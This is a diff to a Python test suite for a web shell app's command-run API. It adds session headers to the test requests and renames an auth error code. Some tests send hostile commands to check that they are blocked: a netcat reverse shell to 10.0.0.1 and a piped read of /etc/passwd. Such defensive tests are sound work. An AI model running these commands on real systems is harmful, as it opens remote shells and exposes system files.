@@ -754,10 +754,10 @@ class TestSecretsRoutes:
                 ),
             ]
             assert created.status_code == 401
-            assert created.get_json()["error"] == "session_required"
+            assert created.get_json()["error"] == "malformed_credential"
             for response in guarded_writes:
                 assert response.status_code == 401
-                assert response.get_json()["error"] == "session_required"
+                assert response.get_json()["error"] == "malformed_credential"
         finally:
             for patcher in reversed(patchers):
                 patcher.stop()
@@ -20971,7 +20971,10 @@ class TestWorkspaceRoutes:
             shell_app_module._last_workspace_cleanup_monotonic = 0
             with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                 from services.workspace.files import ensure_session_workspace
-                expired_root = ensure_session_workspace("expired-session", config.CFG)
+                expired_root = ensure_session_workspace(
+                    anonymous_session_id("expired-session"),
+                    config.CFG,
+                )
                 os.utime(expired_root, (1000, 1000))
 
                 with mock.patch("app.time.monotonic", return_value=1000):
@@ -21056,10 +21059,11 @@ class TestRunRoute:
         )
 
         client = get_client()
+        headers = {"X-Session-ID": anonymous_session_id("broker-unavailable")}
         with mock.patch.object(shell_app_module.log, "warning") as warning, \
              mock.patch("blueprints.run.broker_available", return_value=False), \
              mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"):
-            resp = client.post("/runs", json={"command": "echo hi"})
+            resp = client.post("/runs", json={"command": "echo hi"}, headers=headers)
         assert resp.status_code == 503
         assert json.loads(resp.data)["error"] == "broker unavailable"
         call = next(c for c in warning.call_args_list if c[0][0] == "RUN_BROKER_UNAVAILABLE")
@@ -21142,22 +21146,24 @@ class TestRunRoute:
 
     def test_brokered_run_rejects_invalid_command_payloads(self):
         client = get_client()
+        headers = {"X-Session-ID": anonymous_session_id("invalid-run-payloads")}
         public_started = mock.Mock(run_id="run-public-context", status="running")
         with mock.patch("blueprints.run.broker_available", return_value=True), \
              mock.patch(
                  "blueprints.run._start_brokered_run_service",
                  return_value=public_started,
              ) as public_start:
-            non_object = client.post("/runs", json=["hostname"])
-            missing = client.post("/runs", json={})
-            non_string = client.post("/runs", json={"command": 42})
-            blank = client.post("/runs", json={"command": "   "})
+            non_object = client.post("/runs", json=["hostname"], headers=headers)
+            missing = client.post("/runs", json={}, headers=headers)
+            non_string = client.post("/runs", json={"command": 42}, headers=headers)
+            blank = client.post("/runs", json={"command": "   "}, headers=headers)
             caller_context = client.post(
                 "/runs",
                 json={
                     "command": "echo public",
                     "output_signal_context": {"nuclei_takeover_template": "caller-made"},
                 },
+                headers=headers,
             )
 
         assert non_object.status_code == 400
@@ -21173,10 +21179,15 @@ class TestRunRoute:
 
     def test_brokered_run_disallowed_command_returns_403_before_spawning(self):
         client = get_client()
+        headers = {"X-Session-ID": anonymous_session_id("disallowed-brokered-run")}
         with mock.patch("blueprints.run.broker_available", return_value=True), \
              mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")), \
              mock.patch("blueprints.run.subprocess.Popen") as popen:
-            resp = client.post("/runs", json={"command": "nmap -sS 127.0.0.1"})
+            resp = client.post(
+                "/runs",
+                json={"command": "nmap -sS 127.0.0.1"},
+                headers=headers,
+            )
 
         assert resp.status_code == 403
         assert json.loads(resp.data) == {"error": "blocked"}
@@ -21191,7 +21202,7 @@ class TestRunRoute:
              mock.patch("blueprints.run.subprocess.Popen") as sqlmap_popen, \
              mock.patch("blueprints.run._brokered_synthetic_run") as synthetic:
             responses = [
-                client.post("/runs", json={"command": command})
+                client.post("/runs", json={"command": command}, headers=headers)
                 for command in dangerous_sqlmap_commands
             ]
 
@@ -21608,18 +21619,28 @@ class TestRunRoute:
 
     def test_disallowed_command_returns_403(self):
         client = get_client()
+        headers = {"X-Session-ID": anonymous_session_id("disallowed-command")}
         # Patch in commands' namespace — is_command_allowed calls load_command_policy
         # from commands' own namespace, not from app's.
         with mock.patch("blueprints.run.broker_available", return_value=True), \
              mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
-            resp = client.post("/runs", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
+            resp = client.post(
+                "/runs",
+                json={"command": "nc -e /bin/sh 10.0.0.1 4444"},
+                headers=headers,
+            )
         assert resp.status_code == 403
 
     def test_shell_operator_returns_403(self):
         client = get_client()
+        headers = {"X-Session-ID": anonymous_session_id("shell-operator")}
         with mock.patch("blueprints.run.broker_available", return_value=True), \
              mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
-            resp = client.post("/runs", json={"command": "ping google.com | cat /etc/passwd"})
+            resp = client.post(
+                "/runs",
+                json={"command": "ping google.com | cat /etc/passwd"},
+                headers=headers,
+            )
         assert resp.status_code == 403
 
     def test_non_json_body_handled(self):
